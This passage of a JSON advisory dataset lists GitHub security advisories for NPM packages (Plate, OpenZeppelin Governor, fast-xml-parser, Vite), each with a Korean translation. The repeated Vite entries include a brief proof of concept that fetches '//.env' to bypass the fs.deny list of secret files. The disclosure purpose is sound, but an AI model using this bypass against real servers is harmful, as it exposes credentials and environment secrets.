    "updatedAt": "2023-06-09T22:41:57Z",
    "publishedAt": "2023-06-09T22:41:56Z",
    "references": "https://github.com/udecode/plate/security/advisories/GHSA-4882-hxpr-hrvm\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-34245\nhttps://github.com/udecode/plate/pull/2240\nhttps://github.com/udecode/plate/commit/93dd5712854660874900ae12e4d8e6ff28089eb7\nhttps://github.com/advisories/GHSA-4882-hxpr-hrvm",
    "name": "@udecode/plate-link",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 20.0.0",
    "identifier": "20.0.0",
    "descriptionKR": "### 영향\n링크 플러그인 및 링크 UI 구성 요소의 영향을 받는 버전은 `javascript:` 체계의 사용을 방지하기 위해 URL을 삭제하지 않습니다. 결과적으로 JavaScript URL이 포함된 링크는 악성 콘텐츠를 열거나 붙여넣는 등 다양한 방법을 통해 Plate 편집기에 삽입될 수 있습니다.\n\n### 패치\n`@udecode/plate-link` 20.0.0은 링크 플러그인에 `allowedSchemes` 옵션을 도입하여 이 문제를 해결합니다. 기본값은 `['http', 'https', 'mailto', 'tel']`입니다. 이 목록에 없는 체계를 사용하는 URL은 DOM에 렌더링되지 않습니다.\n\n### 해결 방법\n`@udecode/plate-link`를 버전 20.0.0으로 업데이트할 수 없는 경우 앵커 요소를 렌더링하기 전에 URL 체계를 명시적으로 확인하는 구현으로 `LinkElement` 및 `PlateFloatingLink` 구성 요소를 재정의하는 것이 좋습니다."
  },
  {
    "description": "### Impact\n\nBy frontrunning the creation of a proposal, an attacker can become the proposer and gain the ability to cancel it. The attacker can do this repeatedly to try to prevent a proposal from being proposed at all.\n\nThis impacts the `Governor` contract in v4.9.0 only, and the `GovernorCompatibilityBravo` contract since v4.3.0.\n\n### Patches\n\nThe problem has been patched in 4.9.1 by introducing opt-in frontrunning protection.\n\n### Workarounds\n\nSubmit the proposal creation transaction to an endpoint with frontrunning protection.\n\n### Credit\n\nReported by Lior Abadi and Joaquin Pereyra from Coinspect.\n\n### References\n\nhttps://www.coinspect.com/openzeppelin-governor-dos/",
    "identifiers": "GHSA : GHSA-5h3x-9wvq-w4m2\nCVE : CVE-2023-34234",
    "severity": "MODERATE",
    "updatedAt": "2023-06-08T18:03:18Z",
    "publishedAt": "2023-06-08T18:03:11Z",
    "references": "https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-5h3x-9wvq-w4m2\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-34234\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/commit/d9474327a492f9f310f31bc53f38dbea56ed9a57\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/releases/tag/v4.9.1\nhttps://github.com/advisories/GHSA-5h3x-9wvq-w4m2",
    "name": "@openzeppelin/contracts-upgradeable",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.3.0, < 4.9.1",
    "identifier": "4.9.1",
    "descriptionKR": "### 영향\n\n제안 생성을 선행함으로써 공격자는 제안자가 되어 제안을 취소할 수 있는 능력을 얻을 수 있습니다. 공격자는 제안이 전혀 제안되지 않도록 하기 위해 이 작업을 반복적으로 수행할 수 있습니다.\n\n이는 v4.9.0의 'Governor' 계약과 v4.3.0 이후의 'GovernorCompatibilityBravo' 계약에만 영향을 미칩니다.\n\n### 패치\n\n이 문제는 4.9.1에서 옵트인 전면 실행 보호를 도입하여 패치되었습니다.\n\n### 해결 방법\n\n프런트러닝 보호 기능이 있는 엔드포인트에 제안 생성 트랜잭션을 제출합니다.\n\n### 신용 거래\n\nCoinspect의 Lior Abadi와 Joaquin Pereyra가 보고했습니다.\n\n### 참조\n\nhttps://www.coinspect.com/openzeppelin-governor-dos/"
  },
  {
    "description": "### Impact\n\nBy frontrunning the creation of a proposal, an attacker can become the proposer and gain the ability to cancel it. The attacker can do this repeatedly to try to prevent a proposal from being proposed at all.\n\nThis impacts the `Governor` contract in v4.9.0 only, and the `GovernorCompatibilityBravo` contract since v4.3.0.\n\n### Patches\n\nThe problem has been patched in 4.9.1 by introducing opt-in frontrunning protection.\n\n### Workarounds\n\nSubmit the proposal creation transaction to an endpoint with frontrunning protection.\n\n### Credit\n\nReported by Lior Abadi and Joaquin Pereyra from Coinspect.\n\n### References\n\nhttps://www.coinspect.com/openzeppelin-governor-dos/",
    "identifiers": "GHSA : GHSA-5h3x-9wvq-w4m2\nCVE : CVE-2023-34234",
    "severity": "MODERATE",
    "updatedAt": "2023-06-08T18:03:18Z",
    "publishedAt": "2023-06-08T18:03:11Z",
    "references": "https://github.com/OpenZeppelin/openzeppelin-contracts/security/advisories/GHSA-5h3x-9wvq-w4m2\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-34234\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/commit/d9474327a492f9f310f31bc53f38dbea56ed9a57\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/releases/tag/v4.9.1\nhttps://github.com/advisories/GHSA-5h3x-9wvq-w4m2",
    "name": "@openzeppelin/contracts",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.3.0, < 4.9.1",
    "identifier": "4.9.1",
    "descriptionKR": "### 영향\n\n제안 생성을 선행함으로써 공격자는 제안자가 되어 제안을 취소할 수 있는 능력을 얻을 수 있습니다. 공격자는 제안이 전혀 제안되지 않도록 하기 위해 이 작업을 반복적으로 수행할 수 있습니다.\n\n이는 v4.9.0의 'Governor' 계약과 v4.3.0 이후의 'GovernorCompatibilityBravo' 계약에만 영향을 미칩니다.\n\n### 패치\n\n이 문제는 4.9.1에서 옵트인 전면 실행 보호를 도입하여 패치되었습니다.\n\n### 해결 방법\n\n프런트러닝 보호 기능이 있는 엔드포인트에 제안 생성 트랜잭션을 제출합니다.\n\n### 신용 거래\n\nCoinspect의 Lior Abadi와 Joaquin Pereyra가 보고했습니다.\n\n### 참조\n\nhttps://www.coinspect.com/openzeppelin-governor-dos/"
  },
  {
    "description": "### Impact\n\"fast-xml-parser\" allows special characters in entity names, which are not escaped or sanitized. Since the entity name is used for creating a regex for searching and replacing entities in the XML body, an attacker can abuse it for DoS attacks. By crafting an entity name that results in an intentionally bad performing regex and utilizing it in the entity replacement step of the parser, this can cause the parser to stall for an indefinite amount of time.\n\n### Patches\nThe problem has been resolved in v4.2.4\n\n### Workarounds\nAvoid using DOCTYPE parsing by `processEntities: false` option.\n\n### References\n_Are there any links users can visit to find out more?_\n",
    "identifiers": "GHSA : GHSA-6w63-h3fj-q4vw\nCVE : CVE-2023-34104",
    "severity": "HIGH",
    "updatedAt": "2023-06-06T18:50:17Z",
    "publishedAt": "2023-06-06T17:33:13Z",
    "references": "https://github.com/NaturalIntelligence/fast-xml-parser/security/advisories/GHSA-6w63-h3fj-q4vw\nhttps://github.com/NaturalIntelligence/fast-xml-parser/commit/39b0e050bb909e8499478657f84a3076e39ce76c\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-34104\nhttps://github.com/advisories/GHSA-6w63-h3fj-q4vw",
    "name": "fast-xml-parser",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 4.2.4",
    "identifier": "4.2.4",
    "descriptionKR": "### 영향\n\"fast-xml-parser\"는 엔터티 이름에 이스케이프되거나 삭제되지 않는 특수 문자를 허용합니다. 엔터티 이름은 XML 본문에서 엔터티를 검색하고 바꾸기 위한 정규식을 만드는 데 사용되므로 공격자는 이를 DoS 공격에 악용할 수 있습니다. 의도적으로 잘못된 정규식을 생성하는 엔티티 이름을 만들어 파서의 엔티티 교체 단계에서 이를 활용하면 파서가 무기한 중단될 수 있습니다.\n\n### 패치\n이 문제는 v4.2.4에서 해결되었습니다.\n\n### 해결 방법\n`processEntities: false` 옵션으로 DOCTYPE 구문 분석을 사용하지 마십시오.\n\n### 참조\n_사용자가 자세히 알아보기 위해 방문할 수 있는 링크가 있습니까?_"
  },
  {
    "description": "### Summary\nVite Server Options (`server.fs.deny`) can be bypassed using double forward-slash (//) allows any unauthenticated user to read file from the Vite root-path of the application including the default [`fs.deny` settings](https://vitejs.dev/config/server-options.html#server-fs-deny) (`['.env', '.env.*', '*.{crt,pem}']`)\n\n### Impact\nOnly users explicitly exposing the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host)) are affected, and only files in the immediate Vite project root folder could be exposed.\n\n### Patches\nFixed in vite@4.3.9, vite@4.2.3, vite@4.1.5, vite@4.0.5\nAnd in the latest minors of the previous two majors: vite@3.2.7, vite@2.9.16\n\n### Details\nVite serve the application with under the root-path of the project while running on the dev mode. By default, vite using server options fs.deny to protected the sensitive information of the file. But, with simply double forward-slash, we can bypass this fs restriction. \n\n### PoC\n1. Create a new latest project of vite using any package manager. (here I'm using react and vue templates for tested and pnpm)\n2. Serve the application on dev mode using pnpm run dev.\n3. Directly access the file from url using double forward-slash (`//`) (e.g: `//.env`, `//.env.local`)\n4. Server Options `fs.deny` restrict successfully bypassed.\n\nProof Images:\n![proof-1](https://user-images.githubusercontent.com/30733517/241105344-6ecbc7f6-57b7-45c7-856a-6421a577dda1.png)\n![proof-2](https://user-images.githubusercontent.com/30733517/241105349-ab9561e7-8aff-4f29-97f9-b784e673c122.png)",
    "identifiers": "GHSA : GHSA-353f-5xf4-qw67\nCVE : CVE-2023-34092",
    "severity": "HIGH",
    "updatedAt": "2023-06-09T21:10:12Z",
    "publishedAt": "2023-06-06T02:01:39Z",
    "references": "https://github.com/vitejs/vite/security/advisories/GHSA-353f-5xf4-qw67\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-34092\nhttps://github.com/vitejs/vite/pull/13348\nhttps://github.com/vitejs/vite/commit/813ddd6155c3d54801e264ba832d8347f6f66b32\nhttps://github.com/advisories/GHSA-353f-5xf4-qw67",
    "name": "vite",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.3.0, < 4.3.9",
    "identifier": "4.3.9",
    "descriptionKR": "### 요약\nVite 서버 옵션(`server.fs.deny`)은 이중 슬래시(//)를 사용하여 우회할 수 있으므로 인증되지 않은 사용자는 기본 [`fs.deny` 설정을 포함하여 애플리케이션의 Vite 루트 경로에서 파일을 읽을 수 있습니다. ](https://vitejs.dev/config/server-options.html#server-fs-deny) (`['.env', '.env.*', '*.{crt,pem}']` )\n\n### 영향\nVite 개발 서버를 네트워크에 명시적으로 노출하는 사용자만(`--host` 또는 [`server.host` 구성 옵션 사용](https://vitejs.dev/config/server-options.html#server-host)) 영향을 받고 바로 Vite 프로젝트 루트 폴더에 있는 파일만 노출될 수 있습니다.\n\n### 패치\nvite@4.3.9, vite@4.2.3, vite@4.1.5, vite@4.0.5에서 수정됨\n그리고 이전 두 전공의 최신 부전공: vite@3.2.7, vite@2.9.16\n\n### 세부 정보\nVite는 개발 모드에서 실행되는 동안 프로젝트의 루트 경로 아래에서 애플리케이션을 제공합니다. 기본적으로 서버 옵션 fs.deny를 사용하여 파일의 민감한 정보를 보호하십시오. 그러나 단순히 이중 슬래시를 사용하여 이 fs 제한을 우회할 수 있습니다.\n\n### PoC\n1. 패키지 관리자를 사용하여 vite의 새로운 최신 프로젝트를 만듭니다. (여기서는 테스트 및 pnpm에 반응 및 vue 템플릿을 사용하고 있습니다)\n2. pnpm run dev를 사용하여 개발 모드에서 애플리케이션을 제공합니다.\n3. 이중 슬래시(`//`)를 사용하여 URL에서 파일에 직접 액세스(예: `//.env`, `//.env.local`)\n4. 서버 옵션 `fs.deny` 제한이 성공적으로 우회되었습니다.\n\n증거 이미지:\n![증명-1](https://user-images.githubusercontent.com/30733517/241105344-6ecbc7f6-57b7-45c7-856a-6421a577dda1.png)\n![증명-2](https://user-images.githubusercontent.com/30733517/241105349-ab9561e7-8aff-4f29-97f9-b784e673c122.png)"
  },
  {
    "description": "### Summary\nVite Server Options (`server.fs.deny`) can be bypassed using double forward-slash (//) allows any unauthenticated user to read file from the Vite root-path of the application including the default [`fs.deny` settings](https://vitejs.dev/config/server-options.html#server-fs-deny) (`['.env', '.env.*', '*.{crt,pem}']`)\n\n### Impact\nOnly users explicitly exposing the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host)) are affected, and only files in the immediate Vite project root folder could be exposed.\n\n### Patches\nFixed in vite@4.3.9, vite@4.2.3, vite@4.1.5, vite@4.0.5\nAnd in the latest minors of the previous two majors: vite@3.2.7, vite@2.9.16\n\n### Details\nVite serve the application with under the root-path of the project while running on the dev mode. By default, vite using server options fs.deny to protected the sensitive information of the file. But, with simply double forward-slash, we can bypass this fs restriction. \n\n### PoC\n1. Create a new latest project of vite using any package manager. (here I'm using react and vue templates for tested and pnpm)\n2. Serve the application on dev mode using pnpm run dev.\n3. Directly access the file from url using double forward-slash (`//`) (e.g: `//.env`, `//.env.local`)\n4. Server Options `fs.deny` restrict successfully bypassed.\n\nProof Images:\n![proof-1](https://user-images.githubusercontent.com/30733517/241105344-6ecbc7f6-57b7-45c7-856a-6421a577dda1.png)\n![proof-2](https://user-images.githubusercontent.com/30733517/241105349-ab9561e7-8aff-4f29-97f9-b784e673c122.png)",
    "identifiers": "GHSA : GHSA-353f-5xf4-qw67\nCVE : CVE-2023-34092",
    "severity": "HIGH",
    "updatedAt": "2023-06-09T21:10:12Z",
    "publishedAt": "2023-06-06T02:01:39Z",
    "references": "https://github.com/vitejs/vite/security/advisories/GHSA-353f-5xf4-qw67\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-34092\nhttps://github.com/vitejs/vite/pull/13348\nhttps://github.com/vitejs/vite/commit/813ddd6155c3d54801e264ba832d8347f6f66b32\nhttps://github.com/advisories/GHSA-353f-5xf4-qw67",
    "name": "vite",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.2.0, < 4.2.3",
    "identifier": "4.2.3",
    "descriptionKR": "### 요약\nVite 서버 옵션(`server.fs.deny`)은 이중 슬래시(//)를 사용하여 우회할 수 있으므로 인증되지 않은 사용자는 기본 [`fs.deny` 설정을 포함하여 애플리케이션의 Vite 루트 경로에서 파일을 읽을 수 있습니다. ](https://vitejs.dev/config/server-options.html#server-fs-deny) (`['.env', '.env.*', '*.{crt,pem}']` )\n\n### 영향\nVite 개발 서버를 네트워크에 명시적으로 노출하는 사용자만(`--host` 또는 [`server.host` 구성 옵션 사용](https://vitejs.dev/config/server-options.html#server-host)) 영향을 받고 바로 Vite 프로젝트 루트 폴더에 있는 파일만 노출될 수 있습니다.\n\n### 패치\nvite@4.3.9, vite@4.2.3, vite@4.1.5, vite@4.0.5에서 수정됨\n그리고 이전 두 전공의 최신 부전공: vite@3.2.7, vite@2.9.16\n\n### 세부 정보\nVite는 개발 모드에서 실행되는 동안 프로젝트의 루트 경로 아래에서 애플리케이션을 제공합니다. 기본적으로 서버 옵션 fs.deny를 사용하여 파일의 민감한 정보를 보호하십시오. 그러나 단순히 이중 슬래시를 사용하여 이 fs 제한을 우회할 수 있습니다.\n\n### PoC\n1. 패키지 관리자를 사용하여 vite의 새로운 최신 프로젝트를 만듭니다. (여기서는 테스트 및 pnpm에 반응 및 vue 템플릿을 사용하고 있습니다)\n2. pnpm run dev를 사용하여 개발 모드에서 애플리케이션을 제공합니다.\n3. 이중 슬래시(`//`)를 사용하여 URL에서 파일에 직접 액세스(예: `//.env`, `//.env.local`)\n4. 서버 옵션 `fs.deny` 제한이 성공적으로 우회되었습니다.\n\n증거 이미지:\n![증명-1](https://user-images.githubusercontent.com/30733517/241105344-6ecbc7f6-57b7-45c7-856a-6421a577dda1.png)\n![증명-2](https://user-images.githubusercontent.com/30733517/241105349-ab9561e7-8aff-4f29-97f9-b784e673c122.png)"
  },
  {
    "description": "### Summary\nVite Server Options (`server.fs.deny`) can be bypassed using double forward-slash (//) allows any unauthenticated user to read file from the Vite root-path of the application including the default [`fs.deny` settings](https://vitejs.dev/config/server-options.html#server-fs-deny) (`['.env', '.env.*', '*.{crt,pem}']`)\n\n### Impact\nOnly users explicitly exposing the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host)) are affected, and only files in the immediate Vite project root folder could be exposed.\n\n### Patches\nFixed in vite@4.3.9, vite@4.2.3, vite@4.1.5, vite@4.0.5\nAnd in the latest minors of the previous two majors: vite@3.2.7, vite@2.9.16\n\n### Details\nVite serve the application with under the root-path of the project while running on the dev mode. By default, vite using server options fs.deny to protected the sensitive information of the file. But, with simply double forward-slash, we can bypass this fs restriction. \n\n### PoC\n1. Create a new latest project of vite using any package manager. (here I'm using react and vue templates for tested and pnpm)\n2. Serve the application on dev mode using pnpm run dev.\n3. Directly access the file from url using double forward-slash (`//`) (e.g: `//.env`, `//.env.local`)\n4. Server Options `fs.deny` restrict successfully bypassed.\n\nProof Images:\n![proof-1](https://user-images.githubusercontent.com/30733517/241105344-6ecbc7f6-57b7-45c7-856a-6421a577dda1.png)\n![proof-2](https://user-images.githubusercontent.com/30733517/241105349-ab9561e7-8aff-4f29-97f9-b784e673c122.png)",
    "identifiers": "GHSA : GHSA-353f-5xf4-qw67\nCVE : CVE-2023-34092",
    "severity": "HIGH",
    "updatedAt": "2023-06-09T21:10:12Z",
    "publishedAt": "2023-06-06T02:01:39Z",
    "references": "https://github.com/vitejs/vite/security/advisories/GHSA-353f-5xf4-qw67\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-34092\nhttps://github.com/vitejs/vite/pull/13348\nhttps://github.com/vitejs/vite/commit/813ddd6155c3d54801e264ba832d8347f6f66b32\nhttps://github.com/advisories/GHSA-353f-5xf4-qw67",
    "name": "vite",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.1.0, < 4.1.5",
    "identifier": "4.1.5",
    "descriptionKR": "### 요약\nVite 서버 옵션(`server.fs.deny`)은 이중 슬래시(//)를 사용하여 우회할 수 있으므로 인증되지 않은 사용자는 기본 [`fs.deny` 설정을 포함하여 애플리케이션의 Vite 루트 경로에서 파일을 읽을 수 있습니다. ](https://vitejs.dev/config/server-options.html#server-fs-deny) (`['.env', '.env.*', '*.{crt,pem}']` )\n\n### 영향\nVite 개발 서버를 네트워크에 명시적으로 노출하는 사용자만(`--host` 또는 [`server.host` 구성 옵션 사용](https://vitejs.dev/config/server-options.html#server-host)) 영향을 받고 바로 Vite 프로젝트 루트 폴더에 있는 파일만 노출될 수 있습니다.\n\n### 패치\nvite@4.3.9, vite@4.2.3, vite@4.1.5, vite@4.0.5에서 수정됨\n그리고 이전 두 전공의 최신 부전공: vite@3.2.7, vite@2.9.16\n\n### 세부 정보\nVite는 개발 모드에서 실행되는 동안 프로젝트의 루트 경로 아래에서 애플리케이션을 제공합니다. 기본적으로 서버 옵션 fs.deny를 사용하여 파일의 민감한 정보를 보호하십시오. 그러나 단순히 이중 슬래시를 사용하여 이 fs 제한을 우회할 수 있습니다.\n\n### PoC\n1. 패키지 관리자를 사용하여 vite의 새로운 최신 프로젝트를 만듭니다. (여기서는 테스트 및 pnpm에 반응 및 vue 템플릿을 사용하고 있습니다)\n2. pnpm run dev를 사용하여 개발 모드에서 애플리케이션을 제공합니다.\n3. 이중 슬래시(`//`)를 사용하여 URL에서 파일에 직접 액세스(예: `//.env`, `//.env.local`)\n4. 서버 옵션 `fs.deny` 제한이 성공적으로 우회되었습니다.\n\n증거 이미지:\n![증명-1](https://user-images.githubusercontent.com/30733517/241105344-6ecbc7f6-57b7-45c7-856a-6421a577dda1.png)\n![증명-2](https://user-images.githubusercontent.com/30733517/241105349-ab9561e7-8aff-4f29-97f9-b784e673c122.png)"
  },
  {
    "description": "### Summary\nVite Server Options (`server.fs.deny`) can be bypassed using double forward-slash (//) allows any unauthenticated user to read file from the Vite root-path of the application including the default [`fs.deny` settings](https://vitejs.dev/config/server-options.html#server-fs-deny) (`['.env', '.env.*', '*.{crt,pem}']`)\n\n### Impact\nOnly users explicitly exposing the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host)) are affected, and only files in the immediate Vite project root folder could be exposed.\n\n### Patches\nFixed in vite@4.3.9, vite@4.2.3, vite@4.1.5, vite@4.0.5\nAnd in the latest minors of the previous two majors: vite@3.2.7, vite@2.9.16\n\n### Details\nVite serve the application with under the root-path of the project while running on the dev mode. By default, vite using server options fs.deny to protected the sensitive information of the file. But, with simply double forward-slash, we can bypass this fs restriction. \n\n### PoC\n1. Create a new latest project of vite using any package manager. (here I'm using react and vue templates for tested and pnpm)\n2. Serve the application on dev mode using pnpm run dev.\n3. Directly access the file from url using double forward-slash (`//`) (e.g: `//.env`, `//.env.local`)\n4. Server Options `fs.deny` restrict successfully bypassed.\n\nProof Images:\n![proof-1](https://user-images.githubusercontent.com/30733517/241105344-6ecbc7f6-57b7-45c7-856a-6421a577dda1.png)\n![proof-2](https://user-images.githubusercontent.com/30733517/241105349-ab9561e7-8aff-4f29-97f9-b784e673c122.png)",
    "identifiers": "GHSA : GHSA-353f-5xf4-qw67\nCVE : CVE-2023-34092",
    "severity": "HIGH",
    "updatedAt": "2023-06-09T21:10:12Z",
    "publishedAt": "2023-06-06T02:01:39Z",
    "references": "https://github.com/vitejs/vite/security/advisories/GHSA-353f-5xf4-qw67\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-34092\nhttps://github.com/vitejs/vite/pull/13348\nhttps://github.com/vitejs/vite/commit/813ddd6155c3d54801e264ba832d8347f6f66b32\nhttps://github.com/advisories/GHSA-353f-5xf4-qw67",
    "name": "vite",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 4.0.0, < 4.0.5",
    "identifier": "4.0.5",
    "descriptionKR": "### 요약\nVite 서버 옵션(`server.fs.deny`)은 이중 슬래시(//)를 사용하여 우회할 수 있으므로 인증되지 않은 사용자는 기본 [`fs.deny` 설정을 포함하여 애플리케이션의 Vite 루트 경로에서 파일을 읽을 수 있습니다. ](https://vitejs.dev/config/server-options.html#server-fs-deny) (`['.env', '.env.*', '*.{crt,pem}']` )\n\n### 영향\nVite 개발 서버를 네트워크에 명시적으로 노출하는 사용자만(`--host` 또는 [`server.host` 구성 옵션 사용](https://vitejs.dev/config/server-options.html#server-host)) 영향을 받고 바로 Vite 프로젝트 루트 폴더에 있는 파일만 노출될 수 있습니다.\n\n### 패치\nvite@4.3.9, vite@4.2.3, vite@4.1.5, vite@4.0.5에서 수정됨\n그리고 이전 두 전공의 최신 부전공: vite@3.2.7, vite@2.9.16\n\n### 세부 정보\nVite는 개발 모드에서 실행되는 동안 프로젝트의 루트 경로 아래에서 애플리케이션을 제공합니다. 기본적으로 서버 옵션 fs.deny를 사용하여 파일의 민감한 정보를 보호하십시오. 그러나 단순히 이중 슬래시를 사용하여 이 fs 제한을 우회할 수 있습니다.\n\n### PoC\n1. 패키지 관리자를 사용하여 vite의 새로운 최신 프로젝트를 만듭니다. (여기서는 테스트 및 pnpm에 반응 및 vue 템플릿을 사용하고 있습니다)\n2. pnpm run dev를 사용하여 개발 모드에서 애플리케이션을 제공합니다.\n3. 이중 슬래시(`//`)를 사용하여 URL에서 파일에 직접 액세스(예: `//.env`, `//.env.local`)\n4. 서버 옵션 `fs.deny` 제한이 성공적으로 우회되었습니다.\n\n증거 이미지:\n![증명-1](https://user-images.githubusercontent.com/30733517/241105344-6ecbc7f6-57b7-45c7-856a-6421a577dda1.png)\n![증명-2](https://user-images.githubusercontent.com/30733517/241105349-ab9561e7-8aff-4f29-97f9-b784e673c122.png)"
  },
  {
    "description": "### Summary\nVite Server Options (`server.fs.deny`) can be bypassed using double forward-slash (//) allows any unauthenticated user to read file from the Vite root-path of the application including the default [`fs.deny` settings](https://vitejs.dev/config/server-options.html#server-fs-deny) (`['.env', '.env.*', '*.{crt,pem}']`)\n\n### Impact\nOnly users explicitly exposing the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host)) are affected, and only files in the immediate Vite project root folder could be exposed.\n\n### Patches\nFixed in vite@4.3.9, vite@4.2.3, vite@4.1.5, vite@4.0.5\nAnd in the latest minors of the previous two majors: vite@3.2.7, vite@2.9.16\n\n### Details\nVite serve the application with under the root-path of the project while running on the dev mode. By default, vite using server options fs.deny to protected the sensitive information of the file. But, with simply double forward-slash, we can bypass this fs restriction. \n\n### PoC\n1. Create a new latest project of vite using any package manager. (here I'm using react and vue templates for tested and pnpm)\n2. Serve the application on dev mode using pnpm run dev.\n3. Directly access the file from url using double forward-slash (`//`) (e.g: `//.env`, `//.env.local`)\n4. Server Options `fs.deny` restrict successfully bypassed.\n\nProof Images:\n![proof-1](https://user-images.githubusercontent.com/30733517/241105344-6ecbc7f6-57b7-45c7-856a-6421a577dda1.png)\n![proof-2](https://user-images.githubusercontent.com/30733517/241105349-ab9561e7-8aff-4f29-97f9-b784e673c122.png)",
    "identifiers": "GHSA : GHSA-353f-5xf4-qw67\nCVE : CVE-2023-34092",
    "severity": "HIGH",
    "updatedAt": "2023-06-09T21:10:12Z",
    "publishedAt": "2023-06-06T02:01:39Z",
    "references": "https://github.com/vitejs/vite/security/advisories/GHSA-353f-5xf4-qw67\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-34092\nhttps://github.com/vitejs/vite/pull/13348\nhttps://github.com/vitejs/vite/commit/813ddd6155c3d54801e264ba832d8347f6f66b32\nhttps://github.com/advisories/GHSA-353f-5xf4-qw67",
    "name": "vite",
    "ecosystem": "NPM",
    "vulnerableVersionRange": ">= 3.0.2, < 3.2.7",
    "identifier": "3.2.7",
    "descriptionKR": "### 요약\nVite 서버 옵션(`server.fs.deny`)은 이중 슬래시(//)를 사용하여 우회할 수 있으므로 인증되지 않은 사용자는 기본 [`fs.deny` 설정을 포함하여 애플리케이션의 Vite 루트 경로에서 파일을 읽을 수 있습니다. ](https://vitejs.dev/config/server-options.html#server-fs-deny) (`['.env', '.env.*', '*.{crt,pem}']` )\n\n### 영향\nVite 개발 서버를 네트워크에 명시적으로 노출하는 사용자만(`--host` 또는 [`server.host` 구성 옵션 사용](https://vitejs.dev/config/server-options.html#server-host)) 영향을 받고 바로 Vite 프로젝트 루트 폴더에 있는 파일만 노출될 수 있습니다.\n\n### 패치\nvite@4.3.9, vite@4.2.3, vite@4.1.5, vite@4.0.5에서 수정됨\n그리고 이전 두 전공의 최신 부전공: vite@3.2.7, vite@2.9.16\n\n### 세부 정보\nVite는 개발 모드에서 실행되는 동안 프로젝트의 루트 경로 아래에서 애플리케이션을 제공합니다. 기본적으로 서버 옵션 fs.deny를 사용하여 파일의 민감한 정보를 보호하십시오. 그러나 단순히 이중 슬래시를 사용하여 이 fs 제한을 우회할 수 있습니다.\n\n### PoC\n1. 패키지 관리자를 사용하여 vite의 새로운 최신 프로젝트를 만듭니다. (여기서는 테스트 및 pnpm에 반응 및 vue 템플릿을 사용하고 있습니다)\n2. pnpm run dev를 사용하여 개발 모드에서 애플리케이션을 제공합니다.\n3. 이중 슬래시(`//`)를 사용하여 URL에서 파일에 직접 액세스(예: `//.env`, `//.env.local`)\n4. 서버 옵션 `fs.deny` 제한이 성공적으로 우회되었습니다.\n\n증거 이미지:\n![증명-1](https://user-images.githubusercontent.com/30733517/241105344-6ecbc7f6-57b7-45c7-856a-6421a577dda1.png)\n![증명-2](https://user-images.githubusercontent.com/30733517/241105349-ab9561e7-8aff-4f29-97f9-b784e673c122.png)"
  },
  {
    "description": "### Summary\nVite Server Options (`server.fs.deny`) can be bypassed using double forward-slash (//) allows any unauthenticated user to read file from the Vite root-path of the application including the default [`fs.deny` settings](https://vitejs.dev/config/server-options.html#server-fs-deny) (`['.env', '.env.*', '*.{crt,pem}']`)\n\n### Impact\nOnly users explicitly exposing the Vite dev server to the network (using `--host` or [`server.host` config option](https://vitejs.dev/config/server-options.html#server-host)) are affected, and only files in the immediate Vite project root folder could be exposed.\n\n### Patches\nFixed in vite@4.3.9, vite@4.2.3, vite@4.1.5, vite@4.0.5\nAnd in the latest minors of the previous two majors: vite@3.2.7, vite@2.9.16\n\n### Details\nVite serve the application with under the root-path of the project while running on the dev mode. By default, vite using server options fs.deny to protected the sensitive information of the file. But, with simply double forward-slash, we can bypass this fs restriction. \n\n### PoC\n1. Create a new latest project of vite using any package manager. (here I'm using react and vue templates for tested and pnpm)\n2. Serve the application on dev mode using pnpm run dev.\n3. Directly access the file from url using double forward-slash (`//`) (e.g: `//.env`, `//.env.local`)\n4. Server Options `fs.deny` restrict successfully bypassed.\n\nProof Images:\n![proof-1](https://user-images.githubusercontent.com/30733517/241105344-6ecbc7f6-57b7-45c7-856a-6421a577dda1.png)\n![proof-2](https://user-images.githubusercontent.com/30733517/241105349-ab9561e7-8aff-4f29-97f9-b784e673c122.png)",
    "identifiers": "GHSA : GHSA-353f-5xf4-qw67\nCVE : CVE-2023-34092",
    "severity": "HIGH",
    "updatedAt": "2023-06-09T21:10:12Z",
    "publishedAt": "2023-06-06T02:01:39Z",
    "references": "https://github.com/vitejs/vite/security/advisories/GHSA-353f-5xf4-qw67\nhttps://nvd.nist.gov/vuln/detail/CVE-2023-34092\nhttps://github.com/vitejs/vite/pull/13348\nhttps://github.com/vitejs/vite/commit/813ddd6155c3d54801e264ba832d8347f6f66b32\nhttps://github.com/advisories/GHSA-353f-5xf4-qw67",
    "name": "vite",
    "ecosystem": "NPM",
    "vulnerableVersionRange": "< 2.9.16",
    "identifier": "2.9.16",
